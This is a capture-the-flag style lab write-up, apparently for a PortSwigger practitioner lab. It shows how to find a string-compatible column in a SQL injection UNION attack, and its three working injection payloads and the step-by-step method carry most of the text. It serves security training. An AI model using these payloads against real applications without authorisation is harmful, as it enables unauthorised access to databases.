# SQL Injection UNION Attack — Finding a Column Containing Text


**Lab:** SQL injection UNION attack, finding a column containing text

**Difficulty:** Practitioner

**Status:** Solved ✅


## 🎯 Goal


Determine which column in the SQL query is compatible with **string data**.


The lab provides a random string that must be displayed in the query results.


---


## 1. Determine the Number of Columns


From the previous lab, we already determined that the query returns:


```text

3 columns

```


Therefore, our `UNION SELECT` must also return **3 columns**.


---


## 2. Test Each Column with a String



The lab provided the string:



```text

TiQSdF

```



We test the string in each column while using `NULL` for the others.



### Column 1



```sql

' UNION SELECT 'TiQSdF',NULL,NULL--

```


### Column 2


```sql

' UNION SELECT NULL,'TiQSdF',NULL--

```


### Column 3


```sql

' UNION SELECT NULL,NULL,'TiQSdF'--

```


---


## 3. Result


The second payload successfully displayed the string:


```sql

' UNION SELECT NULL,'TiQSdF',NULL--

```


Therefore:


```text

Column 2 = compatible with string data

```


✅ **Lab solved**


---


## 🧠 Why This Works


A `UNION` attack requires both queries to return the same number of columns.


We already know:


```text

Original query → 3 columns

```


So we construct:


```text

NULL + String + NULL

```


and move the string between the columns until it appears in the response.


```text

Column 1    Column 2    Column 3

   NULL      'TiQSdF'      NULL

                ↑

       String-compatible
```


---


## 🔑 Key Takeaway


**To find a string-compatible column:**


```text

1. Determine number of columns

2. Replace each column with NULL

3. Put a known string in one column at a time

4. The column where the string appears accepts string data

```


### Lab result


```text

Columns: 3

String-compatible column: 2

```

[PortSwigger — SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks?utm_source=chatgpt.com)
